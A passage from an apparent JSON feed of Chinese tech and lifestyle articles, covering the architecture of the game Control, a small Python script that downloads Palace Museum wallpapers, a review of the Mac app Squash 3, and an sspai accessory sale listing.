alt=\"\"><figcaption>斯卡帕设计的墓地与控制中的有机融合设计</figcaption></figure><p>在研究部的主厅中庭，甚至可以看到高耸入顶的巨大红杉，藤蔓查绕着自助餐厅的墙壁生长，巨大的球形打光融化了混凝土的冰冷与棱角，地下的霉菌也偷偷闯入了进来。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-692e479ddf1cbf214887a38928c0f9a1_720w.jpg?source=8673f162\" alt=\"\"><figcaption>主厅中庭巨大的红衫</figcaption></figure><p>粗野主义一直是上个世纪二战之后的代表风格之一，主要用于市政建筑和公寓楼，虽然如今以混凝土打造的现代主义作品越来越少，但不得不承认，它在影视与游戏的娱乐产品设计中焕发了新生。</p>\n<p>希望有兴趣的同学可以去玩玩《控制》这个 3A 游戏，或许真能够对你的建筑学习产生启发~</p>\n<p>最后放上一些具有建筑美感的游戏截图：</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-5c667060c16ae0aba60a8bcf8fd0160f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-6e23b4bec3c813efe01f7fe6205a6728_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-f304d3b0672996df8577a39f9999bf79_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-efc271bf07b3c96a33e0e6480f4396cf_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-d53b825fe4bcd5fda49e291be2e72eeb_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-d2bb62758861f88a5754eef7f451bbe7_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-57d109734bc133c82485510ce9517cb9_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-cdae710773de96451647117ff50dab74_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-93a6aeea1784df24e3fb9b8f37bb1fbf_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-5ecf49b35411c943c4e8528819128916_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-b543f71b75314bfefcfb06ac598f2ef5_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-23295c02124b1651c53a162e8bfee85f_720w.jpg?source=8673f162\" alt=\"\"></figure><p>参考来源：</p>\n<p>Polygon：《Control taught me to love the ugliest architecture》</p>\n<p>Gamasutra：《The real buildings that inspired Control's Oldest House》</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/310699756\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738207"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"一站式图片处理工具，老牌压图工具大更新：Squash 3","date":"2021-07-17 03:33:45","description":"\n<p>老牌批量图片处理压缩工具 Squash 在近期迎来了 3.0 的大版本更新。经过开发商 Realmac 近半年的重构，Squash 3 不仅换上了全新的 UI 风格、添加了诸多功能，其底层也使用最新的 macOS 框架进行了升级，作为 universal app 原生支持了 Intel 和 M1 芯片 Mac。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/01ed0cc93e07426156a37e273c694c55.png\"><figcaption>Squash 3 全新的 UI 和丰富的新增功能</figcaption></figure><p>Squash 3 在图片压缩方面的功能依旧强势。此外，本次更新也给 Squash 带来了许多全新设计的功能，包括批量转换 iPhone 拍摄的 HEIC 图片、设置图片滤镜、修改图片参数、删除图片元数据等等。操作简单、飞速处理，Squash 3 依旧是批量图片压缩、风格处理的不二之选。</p>\n<h2>图片批量压缩转换，现已支持更多格式</h2>\n<p>虽然严格意义上来说 Squash 已经不仅是一款单纯的图片压缩 app 了，但是 Squash 3 仍然拥有沿袭自前代作品的功能全面、体验优秀的图片压缩功能。从批量压缩图片的功能性上来说，Squash 3 不仅处理迅速，压缩处理图像质量高，还支持除了常规 JPEG、PNG 外包括 WebP 和 AVIF 等不同格式的转换。其中，后两种格式是较为新型的在 Web 网页端更为常见的图片格式，有着比 JPEG、PNG 格式更为优秀的存储性能，就如开发者自己所言：</p>\n<blockquote><p>It's just one of the many reasons why Squash is a hidden gem amongst a sea on mediocracy.</p></blockquote>\n<p>另外，Squash 也是直接能够将 iPhone 拍摄的 HEIC 格式图片转换为常规比如 JPEG 格式图片，用于其他场景的应用。不仅仅是普通的图片，包括 PSD 的 Photoshop 文件，Squash 也能够直接导入并批量转换为更适合查看的常规图片格式，极为方便。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/8e8abf99b28459c32037581e827e2698.png\"><figcaption>压缩图片时导出不同格式的设定</figcaption></figure><p>Squash 3 延续了之前简明易懂的操作方式，只需要把需要压缩的图片拖拽进入 Squash 里面，设置好合适的输出格式和压缩参数，即可导出压缩后的图片。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/b92533703a698d8c24d3572c388b2e73.gif\"><figcaption>只需将图片选中拖拽即可批量压缩</figcaption></figure><p>Squash 压缩的图片效果非常好，在减小图片体积的同时，完全没有损失太多图像质量。可以看到，Squash 能够对图像压缩（以及其他特效或后期处理）前后的图像质量进行对比。这里在 Compress 功能区中，虽然我已经将图像质量 quality 调整至最低，但是处理前后的图片左右对比从肉眼的角度来说甚至看不出特别大的区别，而此时这张图片已经从原先的 1.8 MB 被压缩缩小至 440 KB 了，可以说压缩图片这一方面 Squash 确实足够强大。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/f45cf0b9bc4dd604b2ae9930b8d1b562.png\"><figcaption>几乎无损的图片压缩质量</figcaption></figure><p>与此同时，Squash 还支持有对图像的尺寸进行直接调整的功能。比如如果我们有参差不齐、长短不一的图片，有的是横版有的还是竖版，Squash 的图片缩放功能有着「Max Size」的一项设置，即能够自动识别图片的长边，按着预设的尺寸对图片进行等比例缩放，很是实用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/a4afd1f627a3667eaacc44e5f14c031d.png\"><figcaption>图片 Resize 缩放的 Max Size 选项：自动根据长边进行等比例尺寸缩放</figcaption></figure><h2>丰富的批量图片处理功能</h2>\n<p>Squash 在 3.0 时代已经不单单是一个图片压缩工具了，如今的 Squash 在其右手边侧边栏有着丰富的图像后期处理功能，包括对图像的后期调整、直接添加滤镜预设，并还支持某些程度上的重命名文件名自动化操作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/27389ec0f735cb2e921270bd66c6ee65.png\"><figcaption>简单的批量图像后期功能</figcaption></figure><h3>简单的图像后期</h3>\n<p>Squash 并非专业软件，也就没有复杂如 Lightroom 等专业后期软件的功能丰富，但 Squash 也支持部分图像风格的简单调整。在 Squash 的 Adjustments 功能区，我们可以调整图像的 Sepia（图像做旧风格）、Monochrome（黑白风格）、Blur（模糊程度）、Sharpen（锐度）和 Vibrance（自然饱和度）五种属性，来让图像有自己独特的风格特性。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/a6a49786e5decd7aeb46decc6a39a670.gif\"><figcaption>简单调整图片的五种属性来进行风格化处理</figcaption></figure><h3>多样的风格滤镜</h3>\n<p>Squash 3 中还内置了多种不同风格的图像滤镜，在侧边栏的 Effects 处，我们能够批量的为图像添加各种滤镜，其中不乏一些独具风格的图像色彩风格和胶片相机特效。当然，除了标准版本 Squash 3 中内置的 8 个滤镜，在 Squash 官网上还能购买到更多的滤镜特效套装，用于图像的后期风格化处理。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/9b5fa6552d8b8a5edeb3886296c515aa.gif\"><figcaption>为图片批量添加不同的滤镜风格</figcaption></figure><h3>模板化图像重命名</h3>\n<p>另外，Squash 不光可以批量处理图像本身，还能够在某种程度上对图像进行文件名自动化操作。在 Rename 功能区，Squash 能够：</p>\n<ul>\n<li>对处理后的图像自动重命名、添加文件名前缀或者后缀；</li>\n<li>将图像文件名全部改为小写字母；</li>\n<li>将文件名中的空格字符自动替换为下划线「_」或横杠「-」（由于空格在 URL 中显示不算方便）。</li>\n</ul>\n<p>更加能够节约后期对图像文件进行手动处理的时间。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/318d3ea0338e3c7ce21dc6c1f8bdd5f9.png\"><figcaption>自动化文件名称的修改</figcaption></figure><h2>其他功能</h2>\n<p>除了以上的基础功能，Squash 还有一些有趣或有用的额外功能。首先在压缩图片的过程中，大部分软件都会直接删除图像的元数据（即 metadata）以求减小图片体积，但是有时候一些社交软件会利用图像的位置信息等元数据来为图像打标签、提升图片的曝光度等等，此时 Squash 可以有选择性的保留图像的 GPS 位置信息或用于拍摄的相机信息，以保证图像重要的数据不被直接压缩删除。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/874aa5d7dee28170b8655470413c85c1.png\"><figcaption>选择性保留图像位置信息或相机数据</figcaption></figure><p>另外，Squash 3 左上角有一个奇特的小喇叭，实际上是开发者为 Squash 3 加入了许多特征明显的音效，我们可以选择性的开启这些设计巧妙的声音。这些独特的声音和 BGM，是作曲家 Josh Mobley 的作品。在 App Store「<a href=\"https://apps.apple.com/story/id1488005177\">Behind the scenes — 幕后故事</a>」中，Apple 还对这些音乐的制作进行了更为详细的介绍，有兴趣的同学可以前往 Apple 官方文章进行查看。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/41a53764aa9787cae3d98c0bbabc5530.png\"><figcaption>极具风格的 BGM 和声音特效</figcaption></figure><h2>总结</h2>\n<p>Squash 3 在其独家优秀的图片压缩领域依旧功能强悍，如今又加入了如此丰富的批量后期图像操作流程，还有全新的 UI、深色模式支持，以及各种独具匠心的小特性，这些都让 Squash 3 非常值得购买使用，一些基础的图片格式转换功能甚至不用付费可以直接解锁。</p>\n<p>感兴趣的同学可以在开发商 Realmac 的官方网站上下载购买 Squash 3：<a href=\"https://www.realmacsoftware.com/squash/\">Squash 3 for Mac</a>。部分滤镜特效等需要额外付费购买：<a href=\"https://www.realmacsoftware.com/squash/effect-packs/\">Squash Effect Packs</a>。本文的介绍到这里就结束了，感谢大家的阅读。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67655"},{"title":"除了上新还有折扣：来看看这 5 款为「苹果全家桶」用户准备的配件","date":"2021-07-17 01:47:11","description":"\n<p><strong>活动时间：</strong>7.17 ~ 7.19</p>\n<p><strong>活动优惠：</strong>淘宝跨店每满 ￥200 减 ￥20，可叠加</p>\n<p>💸 <a href=\"https://shop549593764.taobao.com/\" target=\"_blank\">马上去购物&gt;</a></p>\n<h2><strong>⚡ 数码好物上新</strong></h2>\n<p>创立于 2005 年，Satechi 是一家来自美国圣地亚哥的配件品牌，最早引起本獭注意是因为他们与苹果原厂配件十分相似的风格，设计简洁、做工精致、喜爱使用铝材……都是我的最初印象。不出意外的，这个「果味儿」十足的品牌部分产品也上线了 Apple Store 在线商城。</p>\n<p>今次我们也上架了 5 款不同类别的配件，覆盖了 Mac、iPad、Apple Watch 等苹果全家桶系列，苹果用户或许能找到自己心仪的那一个。 </p>\n<h3>Satechi 系列</h3>\n<p><strong>Mac mini Type-C 铝制底座 &amp; 扩展坞</strong></p>\n<p>￥488 <s>原价￥528</s></p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=650885602575\" target=\"_blank\">点这买&gt;</a></p>\n<p>得益于 M1 款 Mac mini 的超强性价比，今年有不少消费者选择了这款性能强劲的小主机，而接口全部处于后部多少有点不方便，来自 Satechi 的 Mac mini 扩展坞就是一款解决该痛点的产品。与 Mac 系列同样的铝制设计，通过 Type-C 与机身连接，扩展提供了 7 个接口，分别为 USB-C *1、USB-A *3、micro/SD 卡槽以及 3.5mm 耳机接口。流线型的优雅机身，铝制表面为深空灰色，通过圆形凹槽进行嵌入固定，与你的 Mac Mini 的搭配相得益彰。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/16/ecdb3dba7bc67ea44ae8d72ddc02d5df.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/16/e7d5ddc103f5ec0fbb13aaa33987d9ba.jpg\" alt=\"\"></figure><p> </p>\n<p><strong>Slim X3 背光键盘</strong></p>\n<p>¥548 <s>原价 ¥588</s></p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?id=651255371766\" target=\"_blank\">点这买&gt;</a></p>\n<p>对于追求苹果原生配件风格的人群，Slim X3 无疑是一把「果味儿」十足的键盘，它有着与 Magic Keyboard 相似的设计风格，光滑的铝制表面，采用了灰 / 黑的颜色搭配。X3 键盘专为 Mac 设备设计，F1-F12 为常用快捷调整按钮，拥有数字小键盘区域，最多可以在 4 个设备直接切换。此外配备了可调节的背光按键和可充电的 USB-C 接口，让你无论何时何地都能轻松工作，发挥创造力。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/fc7af52b0ecc63098f4dadb90683a2e8.jpg\"></figure><p><strong>Apple Watch USB-C 充电器</strong></p>\n<p>¥278 <s>原价¥298</s></p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?id=650107252017\" target=\"_blank\">点这买&gt;</a></p>\n<p>Apple Watch 原装充电器线缆太长，外出不便携？这款 Apple Watch 充电器直接省略了线的部分，适用于所有 Apple Watch 尺寸，通过 USB-C 连接到任何供电的设备时，就可以为你的 Apple Watch 充电。同样拥有太空灰的铝制表面，与其他的苹果设备保持了高度一致风格。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/16/6edf5f0a57ac9cf5fb41ac3aff7f5ffe.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/16/cd302df244f4573f4cd1f62013f5a0d3.jpg\" alt=\"\"></figure><p> </p>\n<p><strong>iPad Pro 铝制支架 / 扩展坞</strong></p>\n<p>¥628 <s>原价 ¥688</s></p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?id=650105540893\" target=\"_blank\">点这买&gt;</a></p>\n<p>随着 iPad Pro 一代更比一代强，陆续出现了不少专业用户，把这台平板用出了自己专属的生产力。而对于桌面环境来说，一个支架 / 扩展坞形态的设备是必不可少的，Satechi 的支架+扩展坞二合一产品旨在结合桌面的功能性和平板电脑的便利性，该支架专门苹果 iPad Pro 设计，拥有 HDMI（4K @ 60Hz）、USB-C（PD 最高 60W）、USB-A、Micro/SD 卡槽和 3.5mm 音频接口，可以将 iPad Pro 变成一个功能齐全的工作站。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/3dca7c3cb8948bfffe494a2fde5b0fa5.jpg\"></figure><p> </p>\n<p><strong>二合一磁性无线充电座</strong></p>\n<p>¥388 <s>原价 ¥428</s></p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?id=650523957194\" target=\"_blank\">点这买&gt;</a></p>\n<p>拥有上下两个充电位，为你的 iPhone 12 + AirPods Pro 这对最佳拍档持续供电，上方的 MagSafe 磁吸专为 iPhone 12 设计，可以提供 7.5W 的充电功率，下方无线充电槽为形状 AirPods Pro 设计，也兼容其他大小合适的 Qi 无线充电设备，底座通过 USB-C 供电。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/e6c34bdf47323ad75cc3cd6000d18b20.jpg\"></figure><h3>电派 G4 磁吸无线充电座</h3>\n<p>¥159 <s> 原价 ¥198</s></p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=651246267943\" target=\"_blank\">点这买&gt;</a></p>\n<p>@SamWanng：iMac G4 是一台非常美丽的电脑——半球形底座，金属连杆，透明边框，处处都彰显着它的特别。而前几天收到的这款电派 G4 充电底座，它仿佛是将 iMac G4 的造型按比例缩小至刚好把 iPhone 放置在上面。球形底座，金属连杆，这 iMac G4 中标志性的设计也在这款充电底座上得到了体现。底座底部提供了新型的纳米胶贴，可以很好地固定在桌面上，也能够轻松取下挪动位置，胶贴也可以重复使用。</p>\n<p>使用体验和其他的 MageSafe 充电底座没有太大差异，但是对比那些动辄五六百的品牌来说性价比高了不少。它致敬 iMac G4 的精巧设计，在日常使用中也能够充当一种特别的装饰。</p>\n<p><strong>相关体验：</strong><a href=\"https://sspai.com/post/67734\" target=\"_blank\">新玩意 071 - 电派 iMac G4 无线充电底座</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/72937d50959b1a400eca38d79bd7d70c.JPEG\"></figure><h3><strong>Genki Switch Lite 磁吸保护壳</strong></h3>\n<p>¥138 <s>原价 ¥148</s></p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?id=650517649768\" target=\"_blank\">点这买&gt;</a></p>\n<p>Switch Lite 由于其轻薄、小巧的掌机体验受到了很多玩家的喜爱。而来自 Genki 的磁吸保护壳就是一款非常适合搭配 Lite 的产品，采用了素皮+绒布内里的搭配，另有磁吸的翻盖设计，在需要全面保护时自动吸附，游玩时又可以轻松取下不碍事。如果你搭配 Genki Audio / Lite 蓝牙适配器使用，下方预留了特别尺寸的开孔，方便使用蓝牙耳机进行游戏。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/9190fee01a477085c63987b9730af8e1\"></figure><h3><strong>imPoi 任天堂Switch手柄握把</strong></h3>\n<p>¥59 <s>原价 ¥69</s></p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?id=650518377739\" target=\"_blank\">点这买&gt;</a></p>\n<p>原版的 Joy-Con 握柄在增加了握持感的同时，异形的设计却不是很便携。如果你有类似困扰，不妨试试这款来自 imPoi 的 Switch 手柄握把，简化到只有左右滑轨结构，真机开模的滑槽丝滑流畅，避免刮花，高强度聚苯乙烯材质带来了细腻精致的手感。此外，还会额外附赠一对硅胶保护套。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/16/article/fc7702df511e53a4e2a1f6637b50c1d3\"></figure><h3><strong>鲨鱼君茶包套装 + 鲨鱼贴纸</strong></h3>\n<p>五折促销：￥51.5 <s>原价 ￥103</s>（<strong>注：</strong>保质期至 2021 年 10 月，介意勿拍）</p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?id=634310719101\" target=\"_blank\">点这买&gt;</a></p>\n<p>可爱就完事儿了！大家熟悉的鲨鱼君茶包套装正在五折促销中，附带了 10 袋小海豹异形茶包，还有人人都爱的鲨鲨垂钓摆件，茶包袋的线可以绕在小鲨鱼垂钓的树枝上，玻璃杯、马克杯、随身杯它都能坐得稳稳的。</p>\n<p><strong>相关体验：</strong><a href=\"https://sspai.com/post/62352\" target=\"_blank\">新玩意 034－SAME-Z 杯沿摆件</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/article/71d3785f09a3e7ade01510759813926f\"></figure><h3><strong>几素 x 水獭手持风扇</strong></h3>\n<p>￥29.5 <s>原价 ￥59</s></p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?id=620303316128\" target=\"_blank\">点这买&gt;</a></p>\n<p>夏天怎能少得了风扇，有了这款手持风扇，让你一整个夏天都随时保持凉爽。几素 x 水獭手持风扇使用 Type-C 接口，电池容量为 2000 mAh ，充电一次可提供 21 小时续航时间，提供两档风量调节。采用安全软硅胶扇叶，触碰到扇叶则会自动断电，让你更安心使用；桌面 / 随身折叠两用，展开支架即可变成桌面模式，重量仅为 129g 非常适合随身携带。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/article/ad55f0f1dcb2199ad8135cac21c1a62e\"></figure><h2><strong>🏷️ 除了以上新品，这些老朋友也在打折</strong></h2>\n<p>💡 <a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/27551qmqgfwe8\" target=\"_blank\">点这买明基 ScreenBar Halo 挂灯&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/03d50e5264ec82f1debe7d2b95853234\"></figure><p>🏖️ <a href=\"https://sspai.taobao.com/search.htm?q=%CF%C4%C8%D5%CF%DE%B6%A8&amp;s_from=newHeader&amp;ssid=s5-e&amp;search_type=item&amp;sourceId=tb.item\" target=\"_blank\">点这买夏日限定 T 恤 / 渔夫帽&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/ed9bfcfd72c244beb544ebda7fd5fbe0\"></figure><p>⚡ <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=640849769049\">点这买 inCharge 6 合 1 数据线&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/17/13b78cd55cfd15a6bbb1b5de6a0a4409.png\"></figure><p>🎮 <a href=\"https://sspai.taobao.com/search.htm?orderType=&amp;viewType=grid&amp;keyword=imPoi&amp;lowPrice=&amp;highPrice=\" target=\"_blank\">点这买 imPoi Xbox / PS 手柄充电底座&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/f8b2bfdece0bb5f785cee528c11f7403\"></figure><p>🕹️ <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=650608161875\" target=\"_blank\">点这买极想神秘国度主题 Switch 配件&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/a99bc3ac35ec46d71d6d79b835095e54.png\"></figure><p>🧊 <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=635867096025\" target=\"_blank\">点这买 EraClean 冰箱除味器&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/ec6e577a14d814db069798e93848c2d3\"></figure><p>👟 <a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/3ewloe9lk245s\" target=\"_blank\">点这买 EraClean 除鞋臭喷雾&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/4557004057481e65563c3c56681e07f5\"></figure><p>🌬️ <a href=\"https://item.taobao.com/item.htm?id=619824008848\" target=\"_blank\">点这买几素摇头伸缩风扇&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/c40986b86e8a2683f4c5b32ed21e80d9\"></figure><p>🎐 <a href=\"https://item.taobao.com/item.htm?id=648584163260\" target=\"_blank\">点这买几素静音手提风扇&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/123de22b0a20df5aae556fce836838b7\"></figure><p>📱 <a href=\"https://sspai.taobao.com/search.htm?search=y&amp;keyword=SuperMini&amp;lowPrice=&amp;highPrice=\" target=\"_blank\">点这买 Zendure SuperMini 移动电源&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/51886dcbd3f73e9816e8bbc6b3b9322f\"></figure><p>🔋 <a href=\"https://item.taobao.com/item.htm?id=641900111566\" target=\"_blank\">点这买 Zendure S3 Pro 充电器&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/8439dd00d540687942663461dd1a0ddb\"></figure><p>💻 <a href=\"https://sspai.taobao.com/search.htm?orderType=&amp;viewType=grid&amp;keyword=iQunix&amp;lowPrice=&amp;highPrice=\" target=\"_blank\">点这买 iQunix 支架系列&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/f3830a4c8324f35371a2f02a1b64d8f2\"></figure><p>🌂 <a href=\"https://item.taobao.com/item.htm?id=645835984179\" target=\"_blank\">点这买左都汽车遮阳伞&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/3ba3df8719d768f535a1f3937e9b5c39\"></figure><p>🔌 <a href=\"https://item.taobao.com/item.htm?id=629599437406\" 